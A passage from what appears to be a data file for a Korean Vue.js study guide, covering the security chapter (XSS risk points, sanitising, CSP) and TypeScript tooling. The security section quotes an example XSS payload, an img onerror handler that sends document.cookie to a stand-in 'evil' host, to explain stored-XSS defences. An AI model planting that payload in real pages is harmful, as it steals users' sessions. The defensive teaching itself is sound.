템플릿·HTML·URL·스타일·핸들러에 넣기 전에 소독. '서버가 렌더한 사용자 콘텐츠가 든 노드에 Vue를 마운트하지 말 것'. 백엔드 협조: CSRF 토큰(백엔드), XSSI(백엔드). SSR 고려는 SSR 가이드.",
        code: "<!-- ✓ Vue 가 이스케이프 -->\n<h1>{{ userString }}</h1>                    <!-- textContent -->\n<h1 :title=\"userString\">…</h1>              <!-- setAttribute -->\n\n<!-- ✗ 사용자 문자열을 템플릿으로 — 임의 JS -->\ncreateApp({ template: userProvidedTemplate })\n<div id=\"app\">{{ 사용자 HTML 이 든 서버 렌더 }}</div> → createApp(…).mount('#app')   // in-DOM 도 같음\n\n<!-- 위험 자리 넷 -->\n<div v-html=\"userHtml\"></div>                       <!-- 원시 HTML — 소독 또는 샌드박스 iframe -->\n<a :href=\"sanitizeUrl(userUrl)\">…</a>                <!-- javascript: 차단 — 백엔드에서도 -->\n<a :style=\"{ color: userColor }\">…</a>               <!-- 객체 문법 · 특정 속성만 (position·background 금지) -->\n<a :onclick=\"userJs\">…</a>                           <!-- ✗ 절대 -->",
        terms: [
          {
            term: "XSS (Cross-Site Scripting)",
            body: "사용자가 넣은 문자열이 페이지에서 HTML·JS로 해석되어 실행되는 공격입니다. 쿠키 탈취, 요청 위조, 피싱 UI가 가능합니다. Vue는 {{ }}와 :attr를 이스케이프해 기본 경로를 막지만(실제로 <b>가 글자로), 개발자가 '원시로 넣는' 자리(v-html, 템플릿 문자열, href의 javascript:, 핸들러)는 막지 않습니다. 처방은 입력을 신뢰하지 않고 저장 전 소독, 출력 자리마다 그 자리에 맞는 인코딩, 정말 사용자 HTML을 보여야 하면 샌드박스 iframe입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 <p>{{ Math.max(1, 2) }} {{ typeof performance }} {{ typeof window }}</p>는 '2 undefined undefined'로 템플릿 식이 window·performance 전역에 닿지 못했습니다. 허용 목록(Math·Date·JSON 등)만 열려 있어 템플릿 식 자체가 샌드박스 역할을 합니다. 단 app.config.globalProperties로 열면 닿습니다. 텍스트 보간은 HTML을 이스케이프합니다(JavaScript 노드의 textContent 측정과 같은 메커니즘. {{ '<b>x</b>' }}는 글자). Node의 서버 렌더와 브라우저 빌드 모두 template 문자열을 런타임에 컴파일해 실행했습니다(<button @click=\"n++\">{{ n }}</button> → <button>1</button>). 즉 사용자 문자열을 template으로 넘기면 그 안의 식이 서버·브라우저에서 실행됩니다. 규칙 1의 이유입니다. in-DOM 템플릿은 컨테이너 innerHTML을 템플릿으로 읽었으므로(시작하기 노드), 서버가 사용자 콘텐츠를 그 안에 렌더했다면 같은 문제입니다. v-html은 innerHTML이라 scoped style도 안 먹는다는 것이 API 참고서에 있습니다.",
        code: "// Chrome 156 — 템플릿 식 샌드박스\n{{ typeof window }} {{ typeof performance }} → 'undefined undefined'  (허용 목록 밖)\n{{ '<b>x</b>' }} → 글자 그대로 (textContent 이스케이프)\n\n// Node · Chrome — template 문자열은 실행된다\ncreateSSRApp({ data: () => ({ n: 1 }), template: '<button @click=\"n++\">{{ n }}</button>' }) → <button>1</button>\n→ 사용자 문자열을 template 으로 쓰면 그 식이 실행됨 (규칙 1)\nin-DOM: 컨테이너 innerHTML = 템플릿 → 서버가 사용자 콘텐츠를 그 안에 넣었다면 같은 문제",
      },
      {
        label: "문제: 게시글 본문을 v-html 로 보이자 다른 사용자의 세션이 털린다",
        body: "마크다운을 서버에서 HTML로 바꿔 <div v-html=\"post.html\">로 보입니다. 누군가 본문에 <img src=x onerror=\"fetch('//evil?c='+document.cookie)\">를 넣었습니다. v-html은 innerHTML이라 그대로 실행됩니다. 문서: '사용자 제공 HTML은 샌드박스 iframe이 아니면 100% 안전할 수 없다'. 처방은 겹겹입니다. 마크다운 → HTML 변환 뒤 DOMPurify 같은 소독기로 허용 태그·속성만 남기고(백엔드에서 저장 전에, 프런트에서 출력 전에 둘 다), 쿠키는 HttpOnly로 JS에서 못 읽게, CSP로 인라인 스크립트와 외부 도메인을 막고, 정말 임의 HTML을 보여야 하면 sandbox 속성의 iframe에 넣습니다. 링크의 href도 javascript:를 걸러야 하고(sanitize-url), 템플릿 보간 {{ }}로 보일 수 있는 것은 그것으로 둡니다(실제로 이스케이프).",
      },
      {
        label: "문제가 나는 경우: 데이터와 코드의 경계를 모를 때",
        body: "경우 ㄱ, v-html 사용자 HTML입니다. 위의 사고입니다. 경우 ㄴ, 사용자 문자열을 template으로. 임의 JS(실제로 실행됨). 절대 금지. 경우 ㄷ, 서버가 사용자 콘텐츠를 넣은 노드에 in-DOM 마운트. 같은 문제. 마운트 노드 분리. 경우 ㄹ, :href에 사용자 URL 그대로. javascript:. 소독(백엔드도). 경우 ㅁ, :style에 사용자 문자열. 클릭재킹. 객체 문법·허용 속성만. 경우 ㅂ, :onclick 등 핸들러 속성에 사용자 값. 절대. 경우 ㅅ, 프런트에서만 소독. 저장된 원문이 다른 소비자(앱·메일)에서 터짐. 백엔드 저장 전 소독. 경우 ㅇ, globalProperties에 window·document를 통째로 노출. 템플릿 샌드박스 무력. 필요한 함수만. 경우 ㅈ, 렌더 함수의 innerHTML prop. v-html과 같음. 경우 ㅊ, CSRF를 프런트에서 막으려 함. 백엔드 토큰. 경우 ㅋ, SSR에서 사용자 입력을 템플릿·컴파일 옵션에. 서버 침해. 금지. 경우 ㅌ, CSP 없음. XSS가 나면 외부 전송까지. CSP 헤더(SSR의 nonce). 경우 ㅍ, 소독기를 직접 정규식으로. 우회됨. 검증된 라이브러리.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ v-html 사용자     마크다운 HTML                       XSS                            DOMPurify (서버+클라) · HttpOnly · CSP · iframe\nㄴ 사용자 템플릿     template: userStr                   임의 JS (실제로 실행)             금지\nㄷ in-DOM 사용자 노드  서버 콘텐츠 든 #app                 임의 JS                         마운트 노드 분리\nㄹ URL 그대로       :href=\"userUrl\"                     javascript:                    sanitize-url · 백엔드\nㅁ style 문자열      :style=\"userStyle\"                  클릭재킹                        객체 · 허용 속성\nㅂ 핸들러 속성       :onclick=\"userJs\"                   임의 JS                         금지\nㅅ 프런트만 소독      출력 전만                           원문 저장 → 다른 소비자            저장 전 소독\nㅇ 전역 노출        globalProperties.window             샌드박스 무력                     함수만\nㅈ innerHTML prop    h('div', { innerHTML })             v-html 과 같음                   소독\nㅊ 프런트 CSRF      토큰 없이                           위조 요청                        백엔드 토큰\nㅋ SSR 입력 템플릿    서버에서 컴파일                      서버 침해                        금지\nㅌ CSP 없음        헤더 없음                           XSS 피해 확대                     CSP · nonce\nㅍ 정규식 소독       직접 구현                           우회                            라이브러리",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Vue 는 '데이터 자리' 는 이스케이프하고 '코드 자리' 는 그대로 둔다 — 자리를 아는 것이 보안이다",
        body: "템플릿에서 사용자 값이 들어갈 자리는 둘로 갈립니다. 데이터 자리: 텍스트 보간과 속성 값. Vue가 textContent·setAttribute로 넣어 문자열은 문자열로 남습니다. 코드 자리: 템플릿 자체(컴파일되어 실행 ㄴ, ㄷ, ㅋ), v-html·innerHTML(HTML 파서가 실행 ㄱ, ㅈ), href의 URL 스킴(javascript: ㄹ), style(레이아웃 조작 ㅁ), 이벤트 핸들러(ㅂ). 코드 자리에 넣은 문자열은 그 자리의 언어(HTML·JS·CSS·URL)로 해석됩니다. 템플릿 식의 허용 목록은 '식'이 전역을 못 건드리게 하는 샌드박스지만 globalProperties로 열면 풉니다(ㅇ). 처방은 사용자 값은 데이터 자리에만 두고, 코드 자리에 넣어야 하면 그 자리의 언어에 맞는 소독기(DOMPurify·sanitize-url·허용 속성)를 저장 전과 출력 전에 두고, CSP·HttpOnly·샌드박스 iframe으로 피해를 가두는 것입니다.",
        code: "데이터 자리 (Vue 가 이스케이프):  {{ x }} (textContent) · :attr=\"x\" (setAttribute)\n코드 자리 (그대로 해석):          template (JS ㄴ ㄷ ㅋ) · v-html / innerHTML (HTML ㄱ ㅈ) · :href (URL ㄹ) · :style (CSS ㅁ) · :on* (JS ㅂ)\n식 샌드박스:  허용 목록 (window X) — globalProperties 로 열면 풀림 (ㅇ)\n\n사용자 값 → 데이터 자리에 · 코드 자리면 그 언어의 소독기 (저장 전 + 출력 전 ㅅ) · 피해 가두기 (CSP ㅌ · HttpOnly · sandbox iframe)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "베스트 프랙티스가 끝났습니다. 다음 장 'TypeScript'는 defineComponent·defineProps<T>·Ref<T>·InjectionKey처럼 Vue 코드에 타입을 붙이는 법입니다. 실제로 돌려 보면 3.5의 구조 분해 prop을 watch에 값으로 넘기면 컴파일 에러였고, compileScript가 타입 선언을 런타임 props로 바꿨습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 사용자가 프로필 소개(마크다운)와 웹사이트 링크를 등록합니다. 어디서 무엇을 소독? (2) 관리자가 이메일 템플릿을 Vue 템플릿 문법으로 편집해 미리보기하고 싶어 합니다. 가능한가요? (3) 테마 색을 사용자가 고르면 :style에 넣습니다. 안전한가요?",
        notes: [
          {
            title: "답",
            body: "(1) 소개: 마크다운 → HTML 변환 뒤 DOMPurify로 허용 태그(p, a, strong…)와 속성(href·title)만 남기는 소독을 백엔드 저장 전에 하고(원문을 쓰는 다른 소비자 보호), 프런트 출력 전에도 한 번 더. 그 결과만 v-html로. 링크: sanitize-url 같은 라이브러리로 javascript:·data: 스킴을 걸러 http(s)만 허용하고 rel=\"noopener noreferrer\"를 붙입니다. 소개 안의 <a href>도 소독기의 허용 스킴에 걸립니다. 쿠키는 HttpOnly, CSP 헤더로 인라인 스크립트 차단. (2) 규칙 1 위반입니다. 관리자가 쓴 문자열을 template으로 컴파일하면 그 식이 실행되고(실제로 template 문자열이 서버·브라우저에서 실행) SSR이면 서버에서 실행됩니다. 관리자도 계정 탈취 시 공격자입니다. 대안은 Vue 템플릿이 아닌 '제한된 템플릿 언어'(Mustache/Handlebars의 변수 치환만, 또는 직접 정의한 {{name}} 토큰 치환)를 쓰고 결과 HTML을 소독해 보이는 것입니다. (3) :style=\"{ '--accent': color }\"처럼 객체 문법으로 '특정 속성 하나'에만 넣으면 position·background-image 같은 클릭재킹 속성은 못 건드립니다. 값 자체도 /^#[0-9a-f]{6}$/처럼 검증하면 url(…)이나 expression이 들어갈 여지가 없습니다. 문자열 전체를 :style에 넣는 것은 피합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Security", href: `${DOCS}/guide/best-practices/security` },
      { label: "v-html", href: `${DOCS}/api/built-in-directives#v-html` },
      { label: "SSR — Security", href: `${DOCS}/guide/scaling-up/ssr` },
    ],
  },

  {
    id: "vg-typescript",
    name: "TypeScript와 함께",
    tagline: "타입은 세 자리에서 붙는다: defineComponent/매크로의 제네릭, Ref<T>·InjectionKey<T>, 그리고 템플릿 검사(vue-tsc)",
    intro:
      "가이드의 여덟째 장, 세 페이지입니다. 개요(create-vue·vue-tsc·Vue - Official·tsconfig·defineComponent·템플릿 캐스팅·제네릭 컴포넌트), Composition API와 TS(props·emits·ref·reactive·computed·이벤트·provide/inject·템플릿 ref 타이핑), Options API와 TS(PropType·computed 반환·globalProperties 증강·배치 주의). Vue는 TS로 쓰였고 SFC의 <script lang=\"ts\">와 Composition API가 타입 추론과 잘 맞습니다. 실제로 돌려 보면 compileScript가 defineProps<{ msg?: string; count: number }>()를 런타임 선언 { msg: { type: String, required: false }, count: { type: Number, required: true } }로 바꿨고(타입 → 런타임 검증), 3.5 구조 분해 prop을 watch에 값으로 넘기면 컴파일 에러를 냈습니다.",
    blocks: [
      {
        label: "세 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지                  핵심 한 줄                                                            실제로 돌려 본 것\n1 개요                   vue-tsc 로 검사(Vite 는 안 함) · Vue - Official · isolatedModules · defineComponent · {{ (x as T) }} · generic 속성   -\n2 Composition API 와 TS   defineProps<T>() ↔ 런타임 · withDefaults/구조 분해 · defineEmits 튜플 · ref<T>() · reactive 는 변수에 · InjectionKey · useTemplateRef<T>   타입 선언 → 런타임 props 컴파일 · watch(구조분해) 에러\n3 Options API 와 TS       defineComponent · PropType<T> · computed 반환 주석 · ComponentCustomProperties 증강 (모듈 파일에)         -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: TS 는 컴파일 전에, Vue 컴파일러는 그 뒤에 — 둘이 만나는 자리가 매크로와 템플릿이다",
        body: "TypeScript는 .ts 코드의 타입을 보고, Vue 컴파일러는 .vue의 템플릿과 매크로를 코드로 바꿉니다. 둘이 만나는 자리가 둘입니다. 매크로의 제네릭(defineProps<T>)은 TS 타입이지만 Vue 컴파일러가 읽어 런타임 선언으로 바꾸고(실제로 확인), 템플릿 식은 TS가 직접 못 보니 vue-tsc·Vue - Official이 템플릿을 TS로 바꿔 검사합니다. 자식 셋이 각각입니다.",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '개요'부터입니다.",
      },
    ],
    sources: [
      { label: "Using Vue with TypeScript", href: `${DOCS}/guide/typescript/overview` },
      { label: "TypeScript with Composition API", href: `${DOCS}/guide/typescript/composition-api` },
    ],
  },

  {
    id: "vg-ts-overview",
    name: "TS 개요",
    tagline: "vue-tsc 가 검사하고(Vite 는 안 함), Vue - Official 이 보여 주고, defineComponent 가 추론한다",
    intro:
      "TypeScript 장의 첫 페이지입니다. 설정: create-vue로 Vite + TS 프로젝트. 'Vite 개발 서버와 번들러는 트랜스파일만 하고 타입 검사는 안 하므로' 개발 중 타입 에러는 IDE(Vue - Official)가, CLI·CI·선언 파일 생성은 vue-tsc(tsc 래퍼). tsconfig: isolatedModules: true(esbuild 제약. @vue/tsconfig는 상위 집합 verbatimModuleSyntax), strict(Options API의 this 검사. 최소 noImplicitThis), paths(별칭), TSX면 jsx: 'preserve'와 jsxImportSource: 'vue'. Vue CLI + ts-loader는 '더는 권장하지 않음'. 사용: defineComponent()로 옵션 객체의 타입 추론(JS 컴포넌트도), <script lang=\"ts\">·<script setup lang=\"ts\">면 템플릿 식도 더 엄격히 검사, 템플릿 캐스팅 {{ (x as number).toFixed(2) }}, 제네릭 컴포넌트 <script setup generic=\"T\">. 이 노드는 돌려 본 측정이 적고(타입 검사는 tsc의 일), compileScript의 lang=\"ts\" 처리(타입 선언 → 런타임)를 참고합니다. 이 노드의 질문은 하나입니다. 타입은 어느 단계에서 누가 검사하나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "프로젝트: npm create vue@latest에서 TypeScript 선택. Vite + vue-tsc. 'Vite·esbuild는 TS를 트랜스파일만 한다. 타입 검사는 IDE가, CI는 vue-tsc --noEmit(--watch 가능, vite-plugin-checker로 개발 서버에)'. IDE: VS Code + Vue - Official('Vetur 대체'. Vue 3에선 Vetur 비활성화), WebStorm 2023.2+ 내장. tsconfig 주의: isolatedModules: true 필수(esbuild가 파일 단위라). @vue/tsconfig는 verbatimModuleSyntax(상위 집합). strict 또는 noImplicitThis(없으면 Options API의 this가 any). paths로 @/* 별칭. TSX: jsx: 'preserve', jsxImportSource: 'vue'. 일반: defineComponent()는 '컴포넌트 옵션 객체의 타입 추론을 켜는 런타임 no-op'. props에서 setup(props)·this의 타입 추론. JS 컴포넌트도 추론(JSDoc). SFC: <script lang=\"ts\">·<script setup lang=\"ts\">. 'TS로 쓰면 템플릿 식도 더 엄격한 타입 검사'. 템플릿 캐스팅: {{ (x as number).toFixed(2) }}(Vue CLI는 vue-loader ^16.8.0). 제네릭: <script setup lang=\"ts\" generic=\"T extends string | number, U extends Item\">. 렌더 함수·JSX 컴포넌트는 defineComponent의 함수 시그니처(3.3+)로 제네릭.",
        code: "// tsconfig.json 핵심\n{ \"compilerOptions\": { \"strict\": true, \"isolatedModules\": true, \"jsx\": \"preserve\", \"jsxImportSource\": \"vue\", \"paths\": { \"@/*\": [\"./src/*\"] } } }\n// 또는 \"extends\": \"@vue/tsconfig/tsconfig.dom.json\"\n\n# 검사는 vue-tsc (Vite 는 트랜스파일만)\nnpx vue-tsc --noEmit            # CI\nnpx vue-tsc --noEmit --watch    # 개발 보조 · 또는 vite-plugin-checker\n\n<!-- SFC -->\n<script setup lang=\"ts\" generic=\"T extends { id: string }\">   // 제네릭 컴포넌트\ndefineProps<{ items: T[]; selected: T }>()\n</script>\n<template>\n  <p>{{ (value as number).toFixed(2) }}</p>                  <!-- 템플릿 캐스팅 -->\n</template>\n\n// 보통 객체 — defineComponent 로 추론\nexport default defineComponent({ props: { msg: String }, setup(props) { props.msg /* string | undefined */ } })",
        terms: [
          {
            term: "vue-tsc",
            body: "tsc를 감싸 .vue 파일(<script lang=\"ts\>와 템플릿 식)까지 타입 검사하는 CLI입니다. 템플릿을 가상 TS 코드로 바꿔 검사하므로 {{ user.nmae }} 같은 오타가 컴파일 에러가 됩니다. Vite는 esbuild로 타입을 지우기만 하므로 vue-tsc가 없으면 타입 에러가 빌드를 통과합니다(툴링 노드). Vue - Official 확장이 같은 엔진(Vue 언어 도구)으로 에디터에 표시합니다.",
          },
          {
            term: "defineComponent",
            body: "런타임에는 받은 객체를 그대로 돌려주는 함수이지만, TS에는 '이 객체는 Vue 컴포넌트 옵션'이라고 알려 props → setup(props)·this·emit의 타입을 추론하게 합니다. <script setup>은 컴파일러가 자동으로 감싸므로 필요 없고, 보통 <script>나 .ts 파일의 컴포넌트에 씁니다. 3.3+ 함수 시그니처 defineComponent((props) => render, { props })로 제네릭 TSX 컴포넌트도 됩니다. webpack 트리 셰이킹에는 /*#__PURE__*/ 주석.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 컴파일러가 TS 를 읽는 자리",
        body: "타입 검사(vue-tsc) 자체는 돌리지 않았습니다. Vue 컴파일러가 TS를 어떻게 다루는지만 확인했습니다. compileScript에 <script setup lang=\"ts\">와 defineProps<{ msg?: string; count: number }>()를 주니 출력 props는 { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }. TS 타입 리터럴을 읽어 런타임 타입(String·Number)과 required(옵셔널 ?)를 만들었습니다. 이것이 '타입 기반 선언'이 런타임 검증(개발 모드 경고)까지 가지는 이유입니다. defineModel<string>()은 modelValue: { type: String }, defineEmits<{ change: [id: number] }>()는 emits: [\"change\"]. 출력의 setup 시그니처는 setup(__props: any, { expose: __expose, emit: __emit })로 TS 주석이 남아 있어(lang=\"ts\" 유지) 뒤의 TS 트랜스파일 단계가 지웁니다. 구조 분해한 prop을 watch(count)로 넘기면 컴파일러가 '\"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.'로 막았습니다. 이것은 타입 에러가 아니라 Vue 컴파일러의 정적 검사입니다.",
        code: "// compileScript · lang=\"ts\" (vue 3.5.45)\ndefineProps<{ msg?: string; count: number }>()  → props: { msg: { type: String, required: false, … }, count: { type: Number, required: true } }   (타입 → 런타임)\ndefineModel<string>()                           → modelValue: { type: String }\ndefineEmits<{ change: [id: number] }>()          → emits: [\"change\"]\n출력 setup(__props: any, { expose: __expose, emit: __emit })   ← TS 주석 유지 → 이후 트랜스파일\nwatch(count) (구조 분해 prop)                     → compile error (Vue 컴파일러의 정적 검사 · 타입 검사와 별개)",
      },
      {
        label: "문제: CI 는 녹색인데 에디터는 빨갛다",
        body: "로컬 Vue - Official이 템플릿의 {{ user.nmae }}에 빨간 줄을 내는데 CI의 npm run build(Vite)는 통과하고 배포됐습니다. Vite는 타입을 검사하지 않습니다. 에디터는 Vue 언어 도구로 템플릿까지 검사했고 CI에는 그 단계가 없었던 것입니다. 처방은 CI에 vue-tsc --noEmit을 추가해 빌드 전에 돌리는 것입니다. tsconfig에 strict(최소 noImplicitThis)와 isolatedModules를 두고, .vue가 포함되는 include를 확인합니다. 로컬에서 같은 결과를 더 빨리 보려면 vite-plugin-checker로 개발 서버에 vue-tsc를 띄웁니다. 템플릿 검사가 되려면 <script setup lang=\"ts\">여야 하고, JS 컴포넌트는 defineComponent로 감싸야 추론이 됩니다.",
      },
      {
        label: "문제가 나는 경우: 검사 단계와 추론 조건을 모를 때",
        body: "경우 ㄱ, CI 타입 미검사입니다. 위의 사고입니다. 경우 ㄴ, isolatedModules 없음. esbuild 제약으로 const enum·re-export 타입이 깨짐. 설정. 경우 ㄷ, strict 없이 Options API. this가 any. strict·noImplicitThis. 경우 ㄹ, 보통 객체 컴포넌트에 defineComponent 없음. props 추론 없음. 감싸기. 경우 ㅁ, lang=\"ts\" 없는 SFC에서 타입 기대. JS로 처리. lang=\"ts\". 경우 ㅂ, Vetur 켜진 채. 충돌. Vue - Official만. 경우 ㅅ, 템플릿에서 유니언 타입 메서드 호출. 에러. (x as T) 캐스팅. 경우 ㅇ, 제네릭 컴포넌트를 generic 속성 없이. T가 any. generic=\"T\". 경우 ㅈ, TSX에서 jsxImportSource 없음. React JSX로 해석. 'vue'. 경우 ㅊ, Vue CLI ts-loader 신규. 비권장. Vite. 경우 ㅋ, 경로 별칭이 TS만 알고 Vite가 모름(또는 반대). 둘 다 설정(paths + resolve.alias). 경우 ㅌ, 타입 에러를 // @ts-ignore로 덮음. 런타임 버그. 타입 수정.",
        code: "경우               언제 생기나                       겉모습                          처방\nㄱ CI 미검사        Vite 빌드만                        타입 에러 배포                    vue-tsc --noEmit\nㄴ isolatedModules   미설정                            esbuild 불일치                    true\nㄷ this any        strict 없음 + Options               this 검사 없음                   strict · noImplicitThis\nㄹ defineComponent 없음  export default { … }           추론 없음                        감싸기\nㅁ lang 없음        <script setup> JS                  타입 검사 없음                    lang=\"ts\"\nㅂ Vetur 충돌       둘 다 켜짐                          중복 경고                        Vue - Official 만\nㅅ 유니언 호출      {{ x.toFixed() }}                  TS 에러                         (x as number)\nㅇ 제네릭 any      generic 속성 없음                    T 추론 안 됨                     generic=\"T\"\nㅈ TSX 소스        jsxImportSource 없음                 React 해석                       'vue'\nㅊ ts-loader 신규    Vue CLI                           비권장                          Vite\nㅋ 별칭 불일치      paths ↔ alias                      한쪽만 됨                        둘 다\nㅌ ts-ignore       덮기                               런타임 버그                       수정",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 타입은 '지워지는 것' 이라 검사는 별도 단계이고, Vue 는 그 단계에 템플릿·매크로를 끼운다",
        body: "TS 타입은 실행 코드가 아니라 트랜스파일 때 지워집니다. Vite(esbuild)는 지우기만 하고 검사하지 않으니 검사는 별도 단계(vue-tsc·IDE)여야 합니다(ㄱ, ㅌ). .vue의 템플릿은 TS 파일이 아니라 Vue 언어 도구가 TS로 바꿔 검사하고(ㅅ, ㅁ), 매크로의 제네릭은 Vue 컴파일러가 읽어 런타임 선언으로 바꿉니다(실제로 확인). 추론은 Vue가 '이것이 컴포넌트다'를 알 때만 되므로 defineComponent·<script setup>·generic 속성이 그 표시입니다(ㄹ, ㅇ). tsconfig의 isolatedModules·strict·jsxImportSource는 esbuild와 Vue JSX라는 환경 조건입니다(ㄴ, ㄷ, ㅈ). 처방은 검사 단계를 CI에 두고, 표시(lang·defineComponent·generic)를 빠뜨리지 않고, 환경 조건을 @vue/tsconfig로 맞추는 것입니다.",
        code: "쓰기 (.ts · .vue) → [트랜스파일: esbuild/Vite — 타입 지움 · 검사 X] → 실행\n                 → [검사: vue-tsc · Vue - Official — 템플릿을 TS 로 바꿔 함께] (ㄱ ㅅ ㅌ)\n                 → [Vue 컴파일러: defineProps<T> → 런타임 선언] (실제로)\n추론의 표시: <script setup lang=\"ts\"> (ㅁ) · defineComponent (ㄹ) · generic=\"T\" (ㅇ)\n환경 조건: isolatedModules (ㄴ) · strict (ㄷ) · jsxImportSource 'vue' (ㅈ) → @vue/tsconfig",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 'Composition API와 TS'는 props·emits·ref·reactive·computed·provide/inject·템플릿 ref 각각의 타이핑입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 기존 JS 프로젝트에 TS를 점진 도입합니다. 첫 단계는? (2) 템플릿에서 {{ item.price.toFixed(2) }}가 'price가 string | number'라 에러입니다. (3) <List :items> 컴포넌트가 아이템 타입을 호출 쪽에서 정하게 하려면?",
        notes: [
          {
            title: "답",
            body: "(1) tsconfig를 @vue/tsconfig에서 확장해 isolatedModules·strict를 켜고 allowJs로 JS 파일도 포함합니다. JS 컴포넌트는 defineComponent로 감싸기만 해도 props 추론이 됩니다(문서: JS에도 추론). 새 파일부터 <script setup lang=\"ts\">로 쓰고, CI에 vue-tsc --noEmit을 추가합니다. Vite 빌드는 타입을 검사하지 않으니 이 단계가 없으면 도입 효과가 없습니다. 에디터는 Vue - Official로. (2) 템플릿 식에 TS 캐스팅을 쓸 수 있습니다. {{ (item.price as number).toFixed(2) }}. 더 나은 길은 데이터 타입을 고치거나(price: number) computed로 변환해 템플릿에는 타입이 확정된 값만 두는 것입니다. 템플릿 캐스팅은 Vue 언어 도구가 템플릿을 TS로 바꿀 때 그대로 전달됩니다. (3) <script setup lang=\"ts\" generic=\"T extends { id: string }\">와 defineProps<{ items: T[]; onPick?: (item: T) => void }>(). 호출 쪽이 :items=\"products\"를 넘기면 T가 Product로 추론되어 슬롯 props와 emit 페이로드도 Product가 됩니다. 템플릿 ref로 이 컴포넌트의 인스턴스 타입을 잡으려면 InstanceType이 아니라 vue-component-type-helpers의 ComponentExposed를 씁니다(Composition API와 TS 노드).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Using Vue with TypeScript", href: `${DOCS}/guide/typescript/overview` },
      { label: "Tooling — Type Checking", href: `${DOCS}/guide/scaling-up/tooling` },
      { label: "defineComponent()", href: `${DOCS}/api/general#definecomponent` },
    ],
  },

  {
    id: "vg-ts-composition",
    name: "Composition API와 TS",
    tagline: "defineProps<T>() 는 런타임 선언이 되고, ref<T>() 는 Ref<T | undefined>, InjectionKey<T> 가 inject 의 타입이다",
    intro:
      "TypeScript 장의 둘째 페이지입니다. 자리마다 타이핑 방식이 있습니다. props: 런타임 선언 defineProps({ foo: { type: String, required: true } }) 또는 타입 기반 defineProps<{ foo: string; bar?: number }>()(둘 동시는 불가. 3.3+ import한 타입도 됨. 조건부 타입은 불가). 기본값은 3.5 반응형 구조 분해 const { msg = 'hello' } = defineProps<Props>()(3.4 이하는 withDefaults). 복잡한 타입은 PropType<T>. emits: 호출 시그니처 (e: 'change', id: number): void 또는 3.3+ 명명 튜플 change: [id: number]. ref: 초깃값에서 추론, Ref<T> 주석, ref<string | number>('2020'), ref<number>()는 Ref<number | undefined>. reactive: '변수에 주석(const book: Book = reactive({…})). 제네릭 인자는 비권장'. computed: 추론 또는 computed<number>(). 이벤트 핸들러: (event: Event) → (event.target as HTMLInputElement).value. provide/inject: const key = Symbol() as InjectionKey<string>, inject(key)는 string | undefined(기본값 또는 as). 템플릿 ref: 3.5+ useTemplateRef<HTMLInputElement>('el')(정적 ref는 추론), 컴포넌트는 InstanceType<typeof Comp>, 제네릭 컴포넌트는 ComponentExposed. 실제로 돌려 보면 타입 기반 defineProps가 런타임 { type, required }로 컴파일됐고 구조 분해 prop을 watch에 값으로 넘기면 컴파일 에러였습니다. 이 노드의 질문은 하나입니다. 어느 자리에 어떤 타입 표기를 두나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "props: 런타임 선언은 PropType으로 복잡 타입(book: Object as PropType<Book>). 타입 기반 defineProps<{ foo: string; bar?: number }>()는 '런타임 선언과 동시 사용 불가'. 3.2 이하는 타입 리터럴·로컬 인터페이스만, 3.3+ import한 타입 OK(TS가 peer dep), 조건부 타입은 전체 props 객체에 불가. 기본값: 타입 기반은 default를 못 쓰니 3.5 구조 분해 const { msg = 'hello', labels = ['a', 'b'] } = defineProps<Props>()(참조 타입도 함수로 감쌀 필요 없음). 3.4 이하는 withDefaults(defineProps<Props>(), { msg: 'hello', labels: () => ['a', 'b'] })(참조 타입은 팩토리). emits: 런타임 defineEmits(['change']), 옵션 객체, 타입 기반 defineEmits<{ (e: 'change', id: number): void }>() 또는 3.3+ defineEmits<{ change: [id: number]; update: [value: string] }>(). ref: const year = ref(2020)은 Ref<number>. 다른 타입 허용은 ref<string | number>('2020') 또는 const year: Ref<string | number> = ref('2020'). ref<number>()는 Ref<number | undefined>. reactive: const book: Book = reactive({ title: 'x' }). '제네릭 인자 사용은 비권장(중첩 ref 풀림 타입과 다름)'. computed: 추론. computed<number>(() => …). 핸들러: function handleChange(event: Event) { console.log((event.target as HTMLInputElement).value) }. 주석 없으면 event가 any. provide/inject: import type { InjectionKey } from 'vue'; const key = Symbol() as InjectionKey<string>; provide(key, 'foo'); const foo = inject(key)(string | undefined). 문자열 키는 inject<string>('foo'). undefined 제거는 기본값 또는 as string. 템플릿 ref: const el = useTemplateRef<HTMLInputElement>('el')(3.5+. 정적 ref에 @vue/language-tools 2.1+면 자동 추론). 3.5 전 const el = ref<HTMLInputElement | null>(null). 컴포넌트 ref: InstanceType<typeof MyModal>. 제네릭 컴포넌트는 vue-component-type-helpers의 ComponentExposed<typeof Comp>. 전역 디렉티브 타입: declare module 'vue' { interface GlobalDirectives { vHighlight: … } }.",
        code: "<script setup lang=\"ts\">\nimport type { InjectionKey, PropType } from 'vue'\nimport type { Book } from './types'                              // 3.3+ import 타입 OK\n\n// props — 타입 기반 + 3.5 구조 분해 기본값\nconst { title, author = 'anon', tags = [] } = defineProps<{ title: string; author?: string; tags?: string[] }>()\n// 3.4 이하: withDefaults(defineProps<Props>(), { author: 'anon', tags: () => [] })\n// 런타임 선언 + 복잡 타입: defineProps({ book: { type: Object as PropType<Book>, required: true } })\n\n// emits — 3.3+ 명명 튜플\nconst emit = defineEmits<{ change: [id: number]; update: [value: string] }>()\n\n// ref · reactive · computed\nconst year = ref<string | number>('2020')          // Ref<string | number>\nconst maybe = ref<number>()                        // Ref<number | undefined>\nconst book: Book = reactive({ title: 